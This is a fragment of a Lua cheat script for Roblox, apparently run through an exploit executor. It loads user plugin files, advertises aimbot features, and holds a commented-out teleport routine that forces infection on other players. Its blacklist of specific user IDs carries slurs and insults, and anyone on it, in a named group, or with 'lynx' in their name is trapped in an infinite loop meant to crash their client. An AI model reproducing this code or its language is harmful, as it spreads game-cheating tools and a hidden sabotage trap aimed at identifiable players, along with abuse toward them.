local FileDir,isFolder,makeFolder = syn_io_listdir or list_files,syn_io_isfolder or isfolder,syn_io_makefolder or makefolder

if FileDir and isFolder and makeFolder then 
	if not isFolder'CyAdminPlugins' then 
		makeFolder('CyAdminPlugins')
	end 
	for _,v in pairs(FileDir'CyAdminPlugins') do 
		local WorkingFile = loadfile(v)
		if not WorkingFile then
			ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("There was a syntax error (sadly can\'t output it as loadfile is gay)","All")
		else 
			local Work,Error = pcall(WorkingFile) 
			if not Work then 
				ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Runtime Error"..Error,"All")
			end
		end
	end
end 

local BlacklistTable = {
	[251848039] = true;	-- Cyruzsz | Reason: annoying skid,dick rider
	[57890959] = true;  	-- Fevlix | Reason: annoying skid 
	[339273796] = true; 	-- endlessjj Reason: Forget 
	[363849133] = true;		-- vxonc | Reason: annoying skid 
	[1618476217] = true; 	-- DranghetaSINS | Reason: Alt of V 
	[1508268550] = true; 	-- Zerulogy | Reason: Alt of V 
	[1271632090] = true; 	-- OrphanageKid | Reason: annoying
	[296541717] = true; 	-- R4ELEEN | Reason: https://media.discordapp.net/attachments/710938129896308736/710948890550992906/unknown.png
	[1186330995] = true;	-- rheaper | Reason: Oreo Gang
	[114164798] = true;     -- Slays | Reason: No temptations fat cunt (blacklisted myself)
	[1417460726] = true; 	-- 6tpz | Reason: Oreo Gang
	[20165690] = true;		-- sh6un | Reason: Oreo Gang
	[101320782] = true; 	-- fulldesire | Reason: Oreo Gang
	[838770714] = true; 	-- Synshop | Reason: Oreo Gang 
	[1539633029] = true; 	-- hopoffmygirI | Reason: Oreo Gang
}

if BlacklistTable[LP.UserId] or LP:IsInGroup(5152759) or string.find(LP.Name:lower(),"lynx") then 
	while true do end -- crash that dumb ass skid! 
end 

for i = 1,#Commands do
local Alias = Commands[i].Alias
	Create(Commands[i].Name)
	for v = 1,#Alias do
		Create(Alias[v])
	end
	CreateCommand(UDim2.new(0.0150422715,0,0.0127776451,0 + (i * 20)),Commands[i].Name.." "..Commands[i].Help)
end
print("Command Amount: "..#Commands)

notif("Cyrus' Streets Admin has loaded!","It took "..(tick() - Tick).." seconds to load (Type Commands for help)\nDiscord Invite: nXcZH36",10,"rbxassetid://2474242690") 
notif("Hotkeys:","No chat prefix\nCommandbar Prefix is '\nRight clicking door: lock/unlock\nPressing e with guns stomps",10,nil)   
notif("Newest Update:","Added: aimvelocity [number] (Allows you to change your aimbot prediction velocity) | ForsakenCy is my new account",10,nil)   

--[[
if game.PlaceId == 455366377 then 
	local InfectedTable = {} 

	while wait() do
	if not LP.PlayerGui.HUD.INFEC then LP:Kick'NICE TRY! YOU WILL BE FORCED TO INFECT PEOPLE.' end
		if LP.PlayerGui.HUD.INFEC.Visible then 
			local PlayerC = Players:GetPlayers()
			for i = 1,#PlayerC do 
				local Player = PlayerC[i]
				local Infected = false
				if not InfectedTable[Player] and Player ~= LP then 
				repeat wait()
					if Player.Character and Player.Character:FindFirstChild'Torso' and GetChar():FindFirstChild'Torso' then 
						GetChar().Torso.CFrame = Player.Character.Torso.CFrame
						for i,v in pairs(Player.Character.Humanoid:GetPlayingAnimationTracks()) do 
							if string.find(v.Animation.AnimationId,"4812408744") then 
								Infected = true
								table.insert(InfectedTable,Player)
							end 
						end
						game:GetService'RunService'.Heartbeat:wait()
					end
				until Infected 
				Infected = false
				end
			end
		end
	end 
end
]]
